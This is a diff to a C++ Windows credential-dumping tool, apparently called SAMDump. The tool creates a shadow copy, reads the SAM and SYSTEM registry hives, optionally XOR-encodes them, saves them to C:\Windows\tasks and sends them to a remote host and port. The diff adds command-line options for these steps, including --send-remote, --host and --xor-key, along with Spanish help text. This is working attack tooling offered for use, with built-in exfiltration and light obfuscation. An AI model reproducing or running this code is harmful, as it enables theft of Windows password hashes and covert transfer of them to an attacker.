@@ -12,6 +12,9 @@
 #include <vsbackup.h>
 #include <vector>
 
+#include <string>
+#include <algorithm>
+
 // #include <winsock2.h>
 // #include <ws2tcpip.h>
 
@@ -649,17 +652,126 @@ std::vector<BYTE> encode_bytes(const std::vector<BYTE>& dump_bytes, const std::s
 }
 
 
-int main() {
-    std::wstring output_dir     = L"C:\\Windows\\tasks";
-    std::wstring diskToShadow   = L"C:\\";
-    std::wstring samPath        = L"\\windows\\system32\\config\\sam";
-    std::wstring systemPath     = L"\\windows\\system32\\config\\system";
-    bool xorencode              = true;
-    std::string key_xor         = "SAMDump2025";
-    bool saveLocally            = true;
-    bool sendRemotely           = true;
-    const char* host            = "127.0.0.1";
-    int port                    = 7777;
+void parse_arguments(int argc, char* argv[],
+    std::wstring& output_dir,
+    std::wstring& diskToShadow,
+    bool& xorencode,
+    bool& saveLocally,
+    bool& sendRemotely,
+    std::string& key_xor,
+    std::string& host,
+    int& port) {
+
+    // Valores por defecto
+    output_dir = L"C:\\Windows\\tasks";
+    diskToShadow = L"C:\\";
+    xorencode = false;
+    saveLocally = true;
+    sendRemotely = false;
+    key_xor = "SAMDump2025";
+    host = "127.0.0.1";
+    port = 7777;
+
+    // Convertir argv a vector de strings para easier processing
+    std::vector<std::string> args(argv, argv + argc);
+
+    for (size_t i = 1; i < args.size(); ++i) {
+        if (args[i] == "--output-dir" && i + 1 < args.size()) {
+            std::string dir = args[++i];
+            output_dir = std::wstring(dir.begin(), dir.end());
+        }
+        else if (args[i] == "--disk" && i + 1 < args.size()) {
+            std::string disk = args[++i];
+            diskToShadow = std::wstring(disk.begin(), disk.end());
+        }
+        else if (args[i] == "--xor-key" && i + 1 < args.size()) {
+            key_xor = args[++i];
+            xorencode = true;
+        }
+        else if (args[i] == "--save-local") {
+            // Si hay siguiente argumento y no es otra opción (no empieza con --), entonces es el valor
+            if (i + 1 < args.size() && args[i + 1].find("--") != 0) {
+                std::string value = args[++i];
+                std::transform(value.begin(), value.end(), value.begin(), ::tolower);
+                saveLocally = (value == "true" || value == "1" || value == "yes");
+            }
+            else {
+                // No hay valor, se asume true
+                saveLocally = true;
+            }
+        }
+        else if (args[i] == "--send-remote") {
+            if (i + 1 < args.size() && args[i + 1].find("--") != 0) {
+                std::string value = args[++i];
+                std::transform(value.begin(), value.end(), value.begin(), ::tolower);
+                sendRemotely = (value == "true" || value == "1" || value == "yes");
+            }
+            else {
+                sendRemotely = true;
+            }
+        }
+        else if (args[i] == "--xor-encode") {
+            if (i + 1 < args.size() && args[i + 1].find("--") != 0) {
+                std::string value = args[++i];
+                std::transform(value.begin(), value.end(), value.begin(), ::tolower);
+                xorencode = (value == "true" || value == "1" || value == "yes");
+            }
+            else {
+                xorencode = true;
+            }
+        }
+        else if (args[i] == "--host" && i + 1 < args.size()) {
+            host = args[++i];
+        }
+        else if (args[i] == "--port" && i + 1 < args.size()) {
+            port = std::stoi(args[++i]);
+        }
+        else if (args[i] == "--help") {
+            std::cout << "Uso: " << args[0] << " [OPCIONES]\n";
+            std::cout << "Opciones:\n";
+            std::cout << "  --save-local [BOOL]    Guardar localmente (default: true)\n";
+            std::cout << "  --output-dir DIR     Directorio de salida (default: C:\\Windows\\tasks)\n";
+            std::cout << "  --send-remote [BOOL]   Enviar remotamente (default: false)\n";
+            std::cout << "  --host IP            Host para envio remoto (default: 127.0.0.1)\n";
+            std::cout << "  --port PUERTO        Puerto para envio remoto (default: 7777)\n";
+            std::cout << "  --xor-encode [BOOL]    XOR Encode (default: false)\n";
+            std::cout << "  --xor-key CLAVE      Habilita XOR con clave especificada (default: SAMDump2025)\n";
+            std::cout << "  --disk DISCO         Disco para shadow copy (default: C:\\)\n";
+            std::cout << "  --help               Muestra esta ayuda\n";
+            exit(0);
+        }
+    }
+}
+
+
+int main(int argc, char* argv[]) {
+    // Parsear argumentos
+    std::wstring output_dir;
+    std::wstring diskToShadow;
+    std::wstring samPath;
+    std::wstring systemPath;
+    bool xorencode;
+    bool saveLocally;
+    bool sendRemotely;
+    std::string key_xor;
+    std::string host;
+    int port;
+    parse_arguments(argc, argv, output_dir, diskToShadow, xorencode, saveLocally, sendRemotely, key_xor, host, port);
+    
+    // Mostrar configuracion
+    std::wcout << L"Configuracion:\n";
+    std::wcout << L"  Output Dir: " << output_dir << L"\n";
+    std::wcout << L"  Disk: " << diskToShadow << L"\n";
+    std::wcout << L"  SAM Path: " << samPath << L"\n";
+    std::wcout << L"  System Path: " << systemPath << L"\n";
+    std::cout << "  XOR Encode: " << (xorencode ? "true" : "false") << "\n";
+    std::cout << "  XOR Key: " << key_xor << "\n";
+    std::cout << "  Save Locally: " << (saveLocally ? "true" : "false") << "\n";
+    std::cout << "  Send Remotely: " << (sendRemotely ? "true" : "false") << "\n";
+    std::cout << "  Host: " << host << "\n";
+    std::cout << "  Port: " << port << "\n";
+
+    getchar();
 
     // Get or create Shadow Copy's Device Object
     std::wstring shadowCopyBasePath;
@@ -677,13 +789,14 @@ int main() {
             std::cout << "\nFailed to create a Shadow copy." << std::endl;
         }
     }
-
     size_t pos = shadowCopyBasePath.find(L"\\\\?\\");
     if (pos != std::wstring::npos) {
         shadowCopyBasePath.replace(pos, 4, L"\\??\\");
     }
 
     // Get bytes
+    samPath                         = L"\\windows\\system32\\config\\sam";
+    systemPath                      = L"\\windows\\system32\\config\\system";
     std::wstring fullPathSam        = shadowCopyBasePath + samPath;
     std::wstring fullPathSystem     = shadowCopyBasePath + systemPath;
     std::vector<BYTE> SamBytes      = read_file(fullPathSam.c_str());
@@ -703,7 +816,7 @@ int main() {
     // Save locally
     if (saveLocally) {
         if (SaveSamAndSystemFiles(SamBytes, SystemBytes, output_dir)) {
-            printf("\nArchivos guardados exitosamente en C:\\temp\\\n");
+            printf("\nArchivos guardados exitosamente.\n");
         }
         else {
             printf("\nError guardando archivos\n");
@@ -712,7 +825,7 @@ int main() {
 
     // Send remotely
     if (sendRemotely) {
-        if (send_files_remotely(SamBytes, SystemBytes, host, port)) {
+        if (send_files_remotely(SamBytes, SystemBytes, host.c_str(), port)) {
             printf("Archivos enviados exitosamente\n");
         }
         else {
